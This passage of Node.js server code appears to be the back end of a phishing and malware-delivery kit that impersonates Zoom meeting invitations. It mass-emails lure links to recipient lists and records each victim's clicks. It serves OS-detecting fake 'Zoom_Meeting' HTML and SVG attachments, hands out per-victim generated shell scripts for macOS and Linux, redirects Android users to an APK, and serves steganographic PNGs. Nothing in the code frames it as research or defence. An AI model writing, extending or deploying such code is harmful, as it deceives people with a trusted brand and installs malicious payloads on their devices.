  if (url.pathname.startsWith('/stego/')) {
    const id = url.pathname.slice('/stego/'.length).replace(/\.png$/, '');
    const entry = readDb()[id];
    if (!entry) { res.writeHead(404); res.end('Unknown link'); return; }
    const png = pngWithText('meeting', entry.target);
    res.writeHead(200, {
      'Content-Type': 'image/png',
      'Content-Length': png.length,
      'Cache-Control': 'no-store'
    });
    res.end(png);
    return;
  }
  if (url.pathname === '/dl/macos.command' || url.pathname === '/dl/linux.sh') {
    const mac = url.pathname.endsWith('.command');
    const id = url.searchParams.get('id') || '';
    const entry = id ? readDb()[id] : null;
    const co = entry ? entry.co : '';
    res.writeHead(200, {
      'Content-Type': 'application/octet-stream',
      'Content-Disposition': 'attachment; filename="' + dlName(co, id, mac ? 'command' : 'sh') + '"',
      'Cache-Control': 'no-store',
      'X-Content-Type-Options': 'nosniff'
    });
    res.end(mutateSh(LANDING.replace(/\/$/, ''), mac, id, co));
    return;
  }
  if (url.pathname === '/dl/android') {
    res.writeHead(302, { Location: ANDROID_APK, 'Cache-Control': 'no-store' });
    res.end();
    return;
  }
  if (url.pathname.startsWith('/attach/')) {
    const svg = url.pathname.endsWith('/svg');
    const id = url.pathname.slice('/attach/'.length).replace(/\/svg$/, '');
    const db = readDb();
    const entry = db[id];
    if (!entry) { res.writeHead(404); res.end('Unknown link'); return; }
    entry.clicks = (entry.clicks || 0) + 1;
    entry.last = new Date().toISOString();
    writeDb(db);
    const os = (url.searchParams.get('os') || detectOs(req)).toLowerCase();
    const body = svg
      ? attachmentSvg(entry.target, os, id)
      : attachmentPage(entry.target, os, id);
    res.writeHead(200, {
      'Content-Type': svg ? 'image/svg+xml; charset=utf-8' : 'text/html; charset=utf-8',
      'Content-Disposition': 'attachment; filename="Zoom_Meeting_' + id + (svg ? '.svg' : '.html') + '"',
      'Cache-Control': 'no-store',
      'X-Content-Type-Options': 'nosniff'
    });
    res.end(body);
    return;
  }
  if (url.pathname === '/api/build' && req.method === 'POST') {
    try {
      const body = await collectBody(req);
      const recipients = normalizeEmails(body.emails);
      if (!recipients.length) return json(res, 400, { error: 'Add at least one valid email address.' });
      const meetingId = safeText(body.meetingId, 40) || '82203845974';
      const passcode = safeText(body.pwd, 100);
      const service = safeText(body.service, 20) || 'copy';
      const subject = safeText(body.subject, 140) ||
        'Zoom meeting invitation';
      const intro = safeText(body.message, 400) ||
        'You are invited to a Zoom Private meeting. Open the link below; the page detects your device and prepares the correct client automatically.';
      const who = safeText(body.who, 40);
      const co = safeText(body.co, 80);
      const src = safeText(body.src, 24) || service;
      const os = safeText(body.os, 12);
      const qs = [];
      if (passcode) qs.push('pwd=' + q(passcode));
      if (src) qs.push('src=' + q(src));
      const base = LANDING.replace(/\/$/, '') + '/j/' + encodeURIComponent(meetingId) +
        (qs.length ? '?' + qs.join('&') : '');
      const id = crypto.randomBytes(6).toString('hex');
      const target = PUBLIC + '/t/' + id;
      const db = readDb();
      db[id] = {
        target: base, service, recipients: recipients.length, who, co, src, os,
        created: new Date().toISOString(), clicks: 0
      };
      writeDb(db);
      const link = buildLinks(service, recipients, target, subject, intro);
      const sendResults = [];
      const sendRows = [];
      for (const r of recipients) {
        const result = await sendInviteEmail(r, subject, intro, target);
        sendRows.push({ ts: new Date().toISOString(), id, to: r, sent: !!result.sent, reason: result.reason || '' });
        sendResults.push({ to: r, ...result });
      }
      appendMany(SENDS, sendRows);
      return json(res, 200, {
        id, target, service, recipients, link, subject,
        sent_ok: sendRows.filter((s) => s.sent).length,
        sent_failed: sendRows.filter((s) => !s.sent).length,
        body: intro + '\n\n' + target, sent: sendResults
      });
    } catch (error) {
      return json(res, 400, { error: String(error.message || error) });
    }
  }
  if (url.pathname === '/api/verify' && req.method === 'POST') {
    try {
      const b = await collectBody(req);
      const email = String(b.email || '').toLowerCase();
      const code = String(b.code || '');
      const entry = VERIFY_CODES.get(email);
      if (!entry) return json(res, 404, { error: 'No verification code for this email.' });
      if (Date.now() - entry.created > 10 * 60 * 1000) { VERIFY_CODES.delete(email); return json(res, 410, { error: 'Code expired.' }); }
      if (entry.code !== code) return json(res, 401, { error: 'Invalid code.' });
      VERIFY_CODES.delete(email);
      return json(res, 200, { ok: true, target: entry.target });
    } catch (e) {
      return json(res, 400, { error: String(e.message || e) });
    }
  }
  if (req.method !== 'GET' && req.method !== 'HEAD') return json(res, 405, { error: 'method' });
  serveStatic(res, url.pathname);
});

server.listen(PORT, HOST, () => {
  console.log('[share] listening http://' + HOST + ':' + PORT + ' landing=' + LANDING);
});
